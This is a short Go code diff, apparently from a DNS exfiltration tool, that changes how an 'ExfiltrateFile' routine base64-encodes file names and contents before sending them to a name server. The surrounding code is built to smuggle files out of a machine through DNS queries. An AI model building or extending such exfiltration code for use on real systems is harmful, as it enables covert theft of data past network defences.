@@ -39,10 +39,8 @@ func NewDnsExfiltrator(nameServer string, machineId string, delay int) *DnsExfil
 	}
 }
 
-func encodeToModifiedBase64(data []byte) string {
-	base64Data := base64.URLEncoding.EncodeToString(data)
-	// Cannot have '=' in domain names.
-	return strings.Replace(base64Data, "=", "-", -1)
+func encodeToBase64(data []byte) string {
+	return base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(data)
 }
 
 func (ex *DnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string) {
@@ -99,9 +97,9 @@ func (ex *DnsExfiltrator) ExfiltrateFile(filename string) {
 	}
 
 	unixFilename := strings.Replace(filename, "\\", "/", -1)
-	encodedFilename := encodeToModifiedBase64([]byte(unixFilename))
+	encodedFilename := encodeToBase64([]byte(unixFilename))
 	ex.exfiltrateData(DNS_FILE_START, encodedFilename)
-	encodedData := encodeToModifiedBase64(data)
+	encodedData := encodeToBase64(data)
 	ex.exfiltrateData(DNS_FILE_DATA, encodedData)
 	ex.exfiltrateData(DNS_FILE_END, encodedFilename)
 }
